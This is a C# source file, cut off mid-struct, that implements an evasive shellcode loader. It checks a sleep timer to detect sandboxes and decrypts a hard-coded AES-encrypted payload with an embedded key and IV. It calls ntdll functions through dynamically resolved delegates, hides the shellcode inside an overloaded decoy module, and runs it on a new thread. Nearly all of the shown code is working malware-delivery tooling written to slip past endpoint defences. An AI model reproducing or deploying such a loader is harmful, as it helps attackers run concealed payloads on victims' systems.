using System;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Security.Cryptography.X509Certificates;

namespace test
{
    class Program
    {

        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);
        static void Main(string[] args)
        {
            Console.WriteLine("before sleep");
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 3)
            {
                Console.WriteLine("exit hit");
                return;
            }
            Console.WriteLine("first after sleep");
            IntPtr pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtAllocateVirtualMemory");
            DELEGATES.NtAllocateVirtualMemory NtAllocateVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtAllocateVirtualMemory)) as DELEGATES.NtAllocateVirtualMemory;

            pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtCreateThreadEx");
            DELEGATES.NtCreateThreadEx NtCreateThreadEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtCreateThreadEx)) as DELEGATES.NtCreateThreadEx;

            pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtWaitForSingleObject");
            DELEGATES.NtWaitForSingleObject NtWaitForSingleObject = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtWaitForSingleObject)) as DELEGATES.NtWaitForSingleObject;

            pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtProtectVirtualMemory");
            DELEGATES.NtProtectVirtualMemory NtProtectVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtProtectVirtualMemory)) as DELEGATES.NtProtectVirtualMemory;

            string MyKey = "7C-A7-E7-C7-66-A6-97-E8-30-7E-84-DF-C3-17-E7-87-10-68-B3-DE-40-89-CB-F7-F8-16-B2-D2-BE-BC-2D-AF";
            string Myiv = "EC-F7-83-1C-90-09-82-72-9E-A4-E0-C3-97-59-02-A4";
            byte[] buf = new byte[1536] { 0x15, 0x0a, 0xd0, 0x86, 0xf7, 0xb3, 0xd0, 0x79, 0x25, 0x79, 0xc1, 0x9b, 0xb9, 0xe6, 0xe4, 0x13, 0x1f, 0xfb, 0x6b, 0xe7, 0xfc, 0xc7, 0xd4, 0xd9, 0xb2, 0x33, 0x93, 0x31, 0xfd, 0x8f, 0xca, 0x21, 0x02, 0xae, 0x1e, 0x7e, 0xa3, 0x7e, 0xb1, 0xf7, 0xa8, 0x02, 0xae, 0x6c, 0xca, 0x38, 0x12, 0x0d, 0x59, 0x55, 0xfb, 0x4e, 0xde, 0x7e, 0x4f, 0xe3, 0xd8, 0x40, 0xea, 0x53, 0x73, 0xb5, 0xfa, 0x2e, 0x0d, 0xf3, 0x76, 0x8c, 0x0a, 0x28, 0x79, 0x47, 0xb1, 0x49, 0xb1, 0x6c, 0x3f, 0x22, 0x30, 0xfc, 0xa5, 0x11, 0x32, 0xc0, 0x22, 0xdb, 0x56, 0x28, 0x41, 0x51, 0x94, 0x3e, 0x80, 0xd1, 0x68, 0x9f, 0x0f, 0xbf, 0x58, 0x27, 0x92, 0x8d, 0xea, 0x95, 0x44, 0xd1, 0x70, 0x9f, 0xad, 0x7c, 0xf9, 0xa8, 0x51, 0x01, 0xca, 0x95, 0x8e, 0x6d, 0xa6, 0x35, 0xad, 0xc8, 0xad, 0x8c, 0xe6, 0xfd, 0x35, 0x57, 0x9c, 0x9f, 0xfb, 0xd2, 0xfd, 0x42, 0x2a, 0xbd, 0x50, 0x1e, 0xcf, 0x25, 0x85, 0x7a, 0xcf, 0x5e, 0x5d, 0xe5, 0xd4, 0x22, 0xd8, 0x5b, 0x27, 0xd1, 0xa2, 0x33, 0xd4, 0x9c, 0x00, 0x3a, 0x7a, 0x27, 0x2f, 0xbc, 0x1b, 0x09, 0xe7, 0x8d, 0xed, 0xa6, 0x4d, 0xe3, 0xac, 0x98, 0x14, 0x7f, 0xe5, 0x02, 0xa0, 0xb7, 0xda, 0x82, 0x4c, 0x63, 0x06, 0x09, 0x07, 0xe6, 0x85, 0xe4, 0x1b, 0x3f, 0x68, 0x83, 0x28, 0x95, 0x2b, 0xa8, 0x35, 0xaf, 0xe9, 0xce, 0xe7, 0x42, 0x26, 0xd7, 0x46, 0x8b, 0xe1, 0x7f, 0xaf, 0xb4, 0x02, 0x19, 0x97, 0x67, 0x5a, 0x3b, 0x94, 0xd7, 0x42, 0xb8, 0x0a, 0x69, 0xec, 0x6d, 0x62, 0x4e, 0x96, 0x03, 0xb2, 0x8a, 0x7c, 0xce, 0x42, 0x0f, 0x67, 0xac, 0x91, 0x51, 0x2f, 0x66, 0x5a, 0x34, 0x59, 0x45, 0x44, 0xe3, 0x4b, 0xcb, 0x95, 0x12, 0x10, 0xc8, 0x70, 0xc1, 0xb6, 0xf9, 0x76, 0x3e, 0x4f, 0x89, 0x81, 0x80, 0x6f, 0x84, 0xc5, 0x1b, 0xac, 0x4a, 0xb6, 0x56, 0xd8, 0xdb, 0xa9, 0xea, 0x82, 0x3a, 0xf9, 0xa2, 0x28, 0xcd, 0x98, 0xda, 0x82, 0x31, 0x23, 0x7e, 0xc3, 0xcc, 0x2b, 0xa5, 0x4a, 0xf8, 0xf1, 0x16, 0xa4, 0x7e, 0xd1, 0xdd, 0x18, 0x4a, 0x29, 0x0e, 0xf1, 0x70, 0xac, 0x80, 0x67, 0x3a, 0xb4, 0x8d, 0xbb, 0xad, 0x13, 0xa1, 0x5d, 0xc9, 0x93, 0x5a, 0xd4, 0x17, 0x5f, 0x59, 0x19, 0x86, 0x40, 0x4d, 0x3c, 0x24, 0x32, 0xc8, 0x0a, 0x7f, 0xd6, 0x7c, 0xf0, 0xb8, 0xa9, 0xb5, 0x42, 0xf5, 0xa1, 0x5e, 0x90, 0x8e, 0x21, 0x2e, 0xe7, 0x68, 0xc2, 0x7a, 0x32, 0x74, 0x4f, 0xf6, 0xa3, 0xff, 0x6a, 0x1f, 0x4a, 0xf9, 0x15, 0x18, 0x51, 0x4e, 0x8e, 0x78, 0x5f, 0x5a, 0xd4, 0xdf, 0x80, 0xff, 0x23, 0x50, 0xbe, 0xa6, 0x93, 0x0c, 0xf5, 0x93, 0xf7, 0x0c, 0x22, 0x13, 0x85, 0x03, 0x0c, 0xae, 0xc8, 0x5d, 0x75, 0xe2, 0x87, 0x94, 0xdd, 0x4f, 0x80, 0x59, 0x93, 0x99, 0x97, 0x1c, 0x34, 0x9f, 0xd9, 0x1a, 0xd5, 0xff, 0xfe, 0x96, 0xcf, 0x24, 0xa7, 0xf7, 0x1a, 0x8c, 0x57, 0x78, 0xfa, 0x75, 0xc6, 0xad, 0xd0, 0xec, 0x00, 0x9c, 0x18, 0xf0, 0x88, 0xa2, 0xb6, 0x6a, 0x3d, 0x86, 0x73, 0xc0, 0x0c, 0x1b, 0xeb, 0xee, 0x27, 0xb9, 0xab, 0xd0, 0x09, 0xca, 0x57, 0xe0, 0xe9, 0xe8, 0x09, 0x4a, 0x9b, 0x43, 0xdb, 0xa8, 0xb2, 0x9f, 0x7e, 0x73, 0x1f, 0xdf, 0x90, 0x7b, 0x36, 0xef, 0x4b, 0x4d, 0x4a, 0xbc, 0x7e, 0xdd, 0x65, 0x76, 0xe0, 0x49, 0xaa, 0xf8, 0x21, 0x12, 0x5c, 0x3e, 0x65, 0x36, 0xe0, 0x0f, 0xd4, 0xcf, 0xbb, 0x8b, 0xb6, 0xeb, 0xb4, 0x9a, 0xbe, 0xf4, 0xf1, 0x36, 0xd6, 0xe2, 0x3d, 0x62, 0x47, 0xf9, 0x41, 0x89, 0xad, 0x51, 0xd3, 0x5d, 0xac, 0x9f, 0xca, 0xea, 0x42, 0xe0, 0x8c, 0xed, 0x3e, 0xe9, 0x10, 0xd2, 0xac, 0x35, 0x7c, 0xb7, 0xca, 0xd8, 0x6c, 0xf9, 0xe4, 0xbd, 0x23, 0xbe, 0xb1, 0x6b, 0x1c, 0x6e, 0xd8, 0x96, 0x3e, 0x29, 0x9f, 0x98, 0x96, 0x58, 0x15, 0x1f, 0x44, 0x44, 0x85, 0xa3, 0x7f, 0x7c, 0x58, 0x53, 0x09, 0xf1, 0x0c, 0x96, 0xb0, 0xc2, 0x31, 0x7c, 0x9b, 0x03, 0x20, 0x97, 0xef, 0x22, 0x55, 0x09, 0x27, 0x04, 0x00, 0xad, 0x2a, 0x4f, 0xd3, 0xa1, 0x7c, 0x5f, 0x5b, 0x13, 0x6e, 0xa5, 0x61, 0x96, 0x71, 0xdc, 0x41, 0xb5, 0xf2, 0x60, 0x52, 0xa9, 0x88, 0xab, 0xd8, 0x0d, 0xb8, 0xef, 0xa6, 0x4d, 0x4f, 0x8f, 0xf7, 0x39, 0x3f, 0xa2, 0xaf, 0xf3, 0xd5, 0xf9, 0xc5, 0x9f, 0x39, 0x63, 0x49, 0x94, 0x98, 0xe9, 0x16, 0x05, 0x13, 0x86, 0xe1, 0xa1, 0xed, 0xc8, 0xcd, 0xe8, 0x4b, 0x07, 0xd4, 0x10, 0x67, 0xae, 0xfc, 0x94, 0x7c, 0x6c, 0xa6, 0xaf, 0x56, 0x2c, 0x44, 0x50, 0xee, 0x02, 0x9e, 0x66, 0x0e, 0xc4, 0x58, 0xf9, 0x7e, 0x21, 0x10, 0x4c, 0xe7, 0x04, 0x92, 0x03, 0xe2, 0x6e, 0xaf, 0xf8, 0x43, 0x6f, 0xcc, 0x92, 0xf6, 0x46, 0xa0, 0x59, 0x5f, 0x05, 0xac, 0x23, 0xaa, 0x48, 0x37, 0xb3, 0x58, 0x35, 0xd4, 0x1a, 0x0e, 0x07, 0x47, 0x02, 0xaf, 0x92, 0x7e, 0x03, 0xb7, 0xd8, 0xa8, 0xed, 0x36, 0x58, 0x9c, 0x7e, 0xd4, 0xa6, 0x08, 0xa9, 0x1c, 0x0d, 0xc1, 0xe0, 0x13, 0x02, 0x78, 0xa4, 0x85, 0xa6, 0x4a, 0xf5, 0x4c, 0x14, 0x2b, 0x21, 0xaa, 0x80, 0x65, 0x50, 0xce, 0x99, 0x30, 0x23, 0xe9, 0x4e, 0x7d, 0xe5, 0x1f, 0xae, 0xa0, 0x83, 0xff, 0xa8, 0x3f, 0xf2, 0xd9, 0x86, 0xef, 0x56, 0x38, 0x37, 0xed, 0x2a, 0xbe, 0xdf, 0x79, 0x4d, 0x6f, 0x73, 0x7c, 0x75, 0x8e, 0x33, 0x8f, 0x50, 0x7f, 0xee, 0x35, 0xc3, 0xab, 0xd1, 0x65, 0x71, 0x61, 0x6d, 0x0d, 0x9d, 0xed, 0xd4, 0x9f, 0x96, 0xad, 0x61, 0xf5, 0x5c, 0x95, 0x44, 0x26, 0x47, 0x99, 0x3e, 0x01, 0xce, 0xb3, 0x84, 0x30, 0x9c, 0x16, 0x6d, 0xb4, 0x49, 0x73, 0x1c, 0xb6, 0x05, 0xc6, 0xe0, 0x4c, 0x4f, 0x45, 0xc7, 0x23, 0x9b, 0xf9, 0x5f, 0x20, 0xb1, 0x12, 0x75, 0x4f, 0x8f, 0x37, 0xb2, 0x73, 0x13, 0xbe, 0x00, 0xcd, 0x92, 0xde, 0x28, 0x75, 0x94, 0xb0, 0xa4, 0x64, 0x96, 0x8e, 0x94, 0xfc, 0xd5, 0xa7, 0x2d, 0xd2, 0xf6, 0xde, 0x17, 0x16, 0x10, 0x3d, 0x96, 0xa1, 0x30, 0xa6, 0x5e, 0xa4, 0x62, 0x94, 0x95, 0x02, 0xde, 0x46, 0xf6, 0x2a, 0x6b, 0xa4, 0xda, 0x53, 0xce, 0x7b, 0x1c, 0xce, 0x2f, 0xb2, 0xf0, 0xd5, 0x17, 0x9c, 0x35, 0xf9, 0x65, 0x8d, 0x6b, 0xc1, 0x6d, 0x73, 0x3a, 0xb4, 0x15, 0xc0, 0xf3, 0x8f, 0x98, 0x66, 0x8a, 0xdb, 0xd6, 0x94, 0x34, 0x02, 0xcc, 0xae, 0xfd, 0x29, 0x1b, 0x85, 0x2a, 0x1a, 0xdf, 0xa1, 0xde, 0xd6, 0xdd, 0xcb, 0xb9, 0xae, 0x63, 0x50, 0x16, 0xa7, 0x0b, 0x88, 0xe1, 0xe2, 0xc9, 0x05, 0xc4, 0x56, 0x7b, 0xc4, 0x0c, 0x6b, 0x71, 0x3a, 0x6a, 0x0e, 0x1f, 0x7d, 0x75, 0x77, 0xfb, 0x52, 0x56, 0xa1, 0xdc, 0x4b, 0x2f, 0xe0, 0xfb, 0xfd, 0x35, 0xa7, 0x08, 0x19, 0x72, 0xd1, 0x12, 0xf5, 0x72, 0x71, 0xed, 0x7c, 0x32, 0xef, 0x83, 0xf3, 0xd4, 0x53, 0x64, 0x48, 0x35, 0xa3, 0x66, 0xfd, 0xf2, 0x75, 0x07, 0x16, 0x01, 0x71, 0x4e, 0xff, 0x7e, 0xcc, 0xaf, 0x0a, 0x0d, 0x36, 0x4e, 0x26, 0x45, 0x75, 0xf2, 0x44, 0xf5, 0x21, 0xfd, 0xb1, 0xee, 0x8f, 0xe6, 0xf2, 0xfb, 0xff, 0xe2, 0x3b, 0x63, 0xa7, 0x75, 0x65, 0x05, 0xd8, 0x27, 0xab, 0xd0, 0xa6, 0x0b, 0xbb, 0xc9, 0x39, 0x25, 0x2a, 0x4e, 0xc5, 0xce, 0xb3, 0x10, 0x8c, 0xb2, 0x72, 0xe7, 0xb2, 0x5e, 0x47, 0xfb, 0x88, 0xe0, 0x03, 0x8e, 0x93, 0xa3, 0xbd, 0x5e, 0x43, 0x06, 0x36, 0xa5, 0xbb, 0x44, 0xd2, 0x60, 0xf4, 0x1c, 0x01, 0x18, 0x00, 0x5c, 0xdf, 0x61, 0x80, 0x24, 0x29, 0xe8, 0x80, 0x5c, 0x32, 0x15, 0x54, 0x82, 0xdd, 0xb7, 0xf6, 0x86, 0xa2, 0xb9, 0xfd, 0x12, 0x1e, 0x35, 0x4c, 0xc7, 0x97, 0x61, 0x30, 0x4a, 0x67, 0x26, 0x61, 0x2a, 0xd9, 0xef, 0xac, 0x9b, 0x58, 0xdc, 0x0f, 0x69, 0x9e, 0x48, 0xe5, 0x07, 0x6a, 0x5b, 0x7e, 0x37, 0x16, 0x75, 0x57, 0x00, 0xb3, 0x53, 0x5c, 0xab, 0x38, 0x7a, 0x24, 0xa5, 0x60, 0xd3, 0x33, 0x67, 0x94, 0x6f, 0xfc, 0x01, 0xb4, 0xe7, 0x1d, 0x9b, 0x80, 0xe5, 0xff, 0x2e, 0x44, 0xb2, 0x4c, 0x87, 0xb4, 0xbd, 0x1b, 0x77, 0x22, 0x99, 0x14, 0xb6, 0x7c, 0x3f, 0x62, 0x09, 0x76, 0xda, 0xa2, 0x67, 0x2d, 0xde, 0xb0, 0xdc, 0xed, 0xe5, 0x37, 0x85, 0x3f, 0x08, 0x10, 0x27, 0x81, 0xe9, 0xa5, 0x55, 0x28, 0x41, 0xcb, 0x47, 0x1e, 0xbc, 0x9c, 0xf7, 0x1f, 0xa8, 0x94, 0x4e, 0x18, 0x25, 0x25, 0xe9, 0x43, 0x15, 0xdd, 0x00, 0x21, 0x44, 0xce, 0xd5, 0x4b, 0xf9, 0x1e, 0x3a, 0xcd, 0x3d, 0xc9, 0x8a, 0x89, 0x28, 0x22, 0xf4, 0x43, 0x64, 0xdc, 0x9f, 0xfe, 0x06, 0x6f, 0x90, 0x75, 0xce, 0x6c, 0xf8, 0x28, 0xa9, 0xc4, 0x27, 0x11, 0x5f, 0x0e, 0x44, 0xc8, 0xbc, 0x8e, 0x60, 0xe0, 0x36, 0x3b, 0xa7, 0x6e, 0x71, 0xbd, 0xb0, 0x32, 0x0e, 0x4e, 0x5e, 0x4a, 0xcb, 0x33, 0x55, 0x88, 0x8f, 0xdb, 0x40, 0x6d, 0xf5, 0x6c, 0x78, 0x8c, 0x62, 0x40, 0x6e, 0x36, 0xf9, 0xbe, 0xcf, 0xa6, 0x00, 0xa3, 0x27, 0xac, 0xad, 0x78, 0x78, 0x06, 0x13, 0xaf, 0x5f, 0x90, 0x80, 0x4f, 0x56, 0xd4, 0xa4, 0x08, 0x93, 0x19, 0x03, 0x8c, 0x87, 0xcb, 0xe6, 0x60, 0xea, 0x42, 0x10, 0x8b, 0x0f, 0x22, 0x4e, 0x37, 0xf1, 0xf8, 0xd8, 0xae, 0x8f, 0x38, 0x00, 0x52, 0xcf, 0xed, 0xe9, 0x00, 0x23, 0x99, 0xa3, 0x41, 0xc8, 0x90, 0xf0, 0x8e, 0xe0, 0x71, 0xb6, 0x2b, 0x2e, 0xc7, 0xa2, 0x6d, 0x34, 0x54, 0xc6, 0xa7, 0x7d, 0xac, 0xd1, 0x8b, 0x40, 0x5b, 0xd7, 0xb6, 0x0e, 0xe4, 0x38, 0xe3, 0x9b, 0x80, 0x13, 0xb2, 0x6b, 0x15, 0x9f, 0xae, 0x6e, 0x9c, 0x75, 0x04, 0x1f, 0x4e, 0xab, 0xc5, 0xd0, 0x39, 0xa9, 0x0a, 0x8b, 0xab, 0x50, 0xf6, 0x0f, 0x61, 0x82, 0xe9, 0xac, 0x5a, 0xb7, 0x7e, 0x65, 0x42, 0xf4, 0x03, 0x53, 0xf5, 0x87, 0xf1, 0x70, 0xd0, 0xd1, 0x4d, 0xd1, 0x81, 0xb5, 0x8c, 0x9e, 0xd6, 0x0e, 0x0b, 0x57, 0xc7, 0xdc, 0x18, 0x42, 0x72, 0xb4, 0xe9, 0x33, 0x03, 0x36, 0xf5, 0x4f, 0x73, 0x19, 0xf1, 0x5c, 0xf6, 0x94, 0xd7, 0xd2, 0x11, 0x2e, 0x90, 0x49, 0x8a, 0xe9, 0x3e, 0xaa, 0x02, 0x03, 0xc4, 0xe2, 0xc6, 0x53, 0x2f, 0xde, 0x1c, 0xf2, 0x8e, 0x74, 0x37, 0x09, 0x15, 0x58, 0x5c, 0x63, 0xf6, 0x30, 0x3a, 0x0d, 0x0c, 0xe7, 0xc4, 0x0a, 0x7e, 0xef, 0xfc, 0xbf, 0x31, 0x19, 0xac, 0x4c, 0x08, 0x5e, 0x54, 0x82, 0x39, 0x9e, 0xe0, 0xa8, 0x9e, 0x59, 0x93, 0xa2, 0xbb, 0x8e, 0x36, 0x00, 0xce, 0x2f, 0x3c, 0x6d, 0xab, 0x04, 0x0a, 0x33, 0x88, 0x97, 0x17, 0x6e, 0x75, 0x0d, 0xa7, 0xf8, 0xe2, 0xb8, 0x7e, 0x0e, 0x9d, 0xcb, 0x5a, 0x1e, 0xd7, 0xb7, 0x2b, 0x8e, 0xe8, 0x41, 0x4f, 0x6f, 0x53, 0x7a, 0xa4, 0x67, 0x94, 0x8a, 0x95, 0x10, 0x92, 0x40, 0xdf, 0x32, 0x57, 0xfb, 0xf1, 0x43, 0xe5, 0x0b, 0x85, 0x9e, 0xad, 0x3b, 0xfc, 0x08, 0x97, 0x88, 0x88, 0x56, 0xac, 0x90, 0x92, 0xc4, 0x94, 0x5e };
            //Convert key to bytes
            string[] c1 = MyKey.Split('-');
            byte[] f = new byte[c1.Length];
            for (int i = 0; i < c1.Length; i++) f[i] = Convert.ToByte(c1[i], 16);
            //Convert IV to bytes
            string[] d1 = Myiv.Split('-');
            byte[] g = new byte[d1.Length];
            for (int i = 0; i < d1.Length; i++) g[i] = Convert.ToByte(d1[i], 16);
            string roundtrip = DecryptStringFromBytes_Aes(buf, f, g);
            // Remove dashes from string
            string[] roundnodash = roundtrip.Split('-');
            // Convert Decrypted shellcode back to bytes
            byte[] e = new byte[roundnodash.Length];
            for (int i = 0; i < roundnodash.Length; i++) e[i] = Convert.ToByte(roundnodash[i], 16);

            IntPtr hCurrentProcess = GetCurrentProcess();
            /*
            IntPtr pMemoryAllocation = new IntPtr(); // needs to be passed as ref
            IntPtr pZeroBits = IntPtr.Zero;
            IntPtr pAllocationSize = new IntPtr(Convert.ToUInt32(e.Length)); // needs to be passed as ref
            uint allocationType = 0x3000;
            uint protection = 0x00000004;
            NtAllocateVirtualMemory(hCurrentProcess, ref pMemoryAllocation, pZeroBits, ref pAllocationSize, allocationType, protection);
            */
            IntPtr moduleinfo = Invoke.OverloadModule(e, null, true);
            IntPtr startaddress = moduleinfo + 4096;
            Marshal.Copy(e, 0, startaddress, e.Length);
            UInt32 oldprotect = 0;
            IntPtr bufferlength = new IntPtr(e.Length);
            NtProtectVirtualMemory.DynamicInvoke(hCurrentProcess, startaddress, bufferlength, STRUCTS.PAGE_EXECUTE_READ, oldprotect);
            //STRUCTS.PE_MANUAL_MAP moduleinfo = Invoke.OverloadModule(e, null, true);
            IntPtr hThread = new IntPtr(0);
            STRUCTS.ACCESS_MASK desiredAccess = STRUCTS.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | STRUCTS.ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
            IntPtr pObjectAttributes = new IntPtr(0);
            IntPtr lpParameter = new IntPtr(0);
            bool bCreateSuspended = false;
            int stackZeroBits = 0;
            int sizeOfStackCommit = 0xFFFF;
            int sizeOfStackReserve = 0xFFFF;
            IntPtr pBytesBuffer = new IntPtr(0);

            NtCreateThreadEx(out hThread, desiredAccess, pObjectAttributes, hCurrentProcess, startaddress, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
            NtWaitForSingleObject(hThread, false, 0);
        }

        static string DecryptStringFromBytes_Aes(byte[] cipherText, byte[] Key, byte[] IV)
        {
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");
            string plaintext = null;
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Key;
                aesAlg.IV = IV;
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }
            }
            return plaintext;
        }

    }

    public class DELEGATES
    {
        //standalone delegates
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtCreateThreadEx(out IntPtr threadHandle, STRUCTS.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtWaitForSingleObject(IntPtr ProcessHandle, Boolean Alertable, int TimeOut);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate void RtlZeroMemory(IntPtr Destination, IntPtr length);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtOpenFile(ref IntPtr FileHandle, STRUCTS.FileAccessFlags DesiredAccess, ref STRUCTS.OBJECT_ATTRIBUTES ObjAttr, ref STRUCTS.IO_STATUS_BLOCK IoStatusBlock, STRUCTS.FileShareFlags ShareAccess, STRUCTS.FileOpenFlags OpenOptions);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtCreateSection(ref IntPtr SectionHandle, uint DesiredAccess, IntPtr ObjectAttributes, ref ulong MaximumSize, uint SectionPageProtection, uint AllocationAttributes, IntPtr FileHandle);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, out IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, IntPtr SectionOffset, out ulong ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate void RtlInitUnicodeString(ref STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)]string SourceString);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate Boolean CloseHandle(IntPtr hProcess);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, UInt32 BufferLength, ref UInt32 BytesWritten);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 LdrGetProcedureAddress(IntPtr hModule, IntPtr FunctionName, IntPtr Ordinal, ref IntPtr FunctionAddress);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 RtlGetVersion(ref STRUCTS.OSVERSIONINFOEX VersionInformation);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtQueryInformationProcess(IntPtr processHandle, STRUCTS.PROCESSINFOCLASS processInformationClass, out IntPtr processInformation, int processInformationLength, ref UInt32 returnLength);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate STRUCTS.NTSTATUS LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref STRUCTS.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle);
    }
    public class STRUCTS
    {
        public const UInt32 PAGE_NOACCESS = 0x01;
        public const UInt32 PAGE_READONLY = 0x02;
        public const UInt32 PAGE_READWRITE = 0x04;
        public const UInt32 PAGE_WRITECOPY = 0x08;
        public const UInt32 PAGE_EXECUTE = 0x10;
        public const UInt32 PAGE_EXECUTE_READ = 0x20;
        public const UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        public const UInt32 PAGE_EXECUTE_WRITECOPY = 0x80;
        public const UInt32 PAGE_GUARD = 0x100;
        public const UInt32 PAGE_NOCACHE = 0x200;
        public const UInt32 PAGE_WRITECOMBINE = 0x400;
        public const UInt32 PAGE_TARGETS_INVALID = 0x40000000;
        public const UInt32 PAGE_TARGETS_NO_UPDATE = 0x40000000;
        public const UInt32 SEC_IMAGE = 0x1000000;
        public enum ACCESS_MASK : uint
        {
            DELETE = 0x00010000,
            READ_CONTROL = 0x00020000,
            WRITE_DAC = 0x00040000,
            WRITE_OWNER = 0x00080000,
            SYNCHRONIZE = 0x00100000,
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            STANDARD_RIGHTS_WRITE = 0x00020000,
            STANDARD_RIGHTS_EXECUTE = 0x00020000,
            STANDARD_RIGHTS_ALL = 0x001F0000,
            SPECIFIC_RIGHTS_ALL = 0x0000FFF,
            ACCESS_SYSTEM_SECURITY = 0x01000000,
            MAXIMUM_ALLOWED = 0x02000000,
            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000,
            GENERIC_EXECUTE = 0x20000000,
            GENERIC_ALL = 0x10000000,
            DESKTOP_READOBJECTS = 0x00000001,
            DESKTOP_CREATEWINDOW = 0x00000002,
            DESKTOP_CREATEMENU = 0x00000004,
            DESKTOP_HOOKCONTROL = 0x00000008,
            DESKTOP_JOURNALRECORD = 0x00000010,
            DESKTOP_JOURNALPLAYBACK = 0x00000020,
            DESKTOP_ENUMERATE = 0x00000040,
            DESKTOP_WRITEOBJECTS = 0x00000080,
            DESKTOP_SWITCHDESKTOP = 0x00000100,
            WINSTA_ENUMDESKTOPS = 0x00000001,
            WINSTA_READATTRIBUTES = 0x00000002,
            WINSTA_ACCESSCLIPBOARD = 0x00000004,
            WINSTA_CREATEDESKTOP = 0x00000008,
            WINSTA_WRITEATTRIBUTES = 0x00000010,
            WINSTA_ACCESSGLOBALATOMS = 0x00000020,
            WINSTA_EXITWINDOWS = 0x00000040,
            WINSTA_ENUMERATE = 0x00000100,
            WINSTA_READSCREEN = 0x00000200,
            WINSTA_ALL_ACCESS = 0x0000037F,
            SECTION_ALL_ACCESS = 0x10000000,
            SECTION_QUERY = 0x0001,
            SECTION_MAP_WRITE = 0x0002,
            SECTION_MAP_READ = 0x0004,
            SECTION_MAP_EXECUTE = 0x0008,
            SECTION_EXTEND_SIZE = 0x0010
        };
        [StructLayout(LayoutKind.Sequential)]
        public struct PE_MANUAL_MAP
        {
            public String DecoyModule;
            public IntPtr ModuleBase;
            public PE_META_DATA PEINFO;
        };
        [StructLayout(LayoutKind.Sequential)]
        public struct PE_META_DATA
        {
            public UInt32 Pe;
            public Boolean Is32Bit;
            public IMAGE_FILE_HEADER ImageFileHeader;
            public IMAGE_OPTIONAL_HEADER32 OptHeader32;
            public IMAGE_OPTIONAL_HEADER64 OptHeader64;
            public IMAGE_SECTION_HEADER[] Sections;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER32
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt32 BaseOfData;
            public UInt32 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
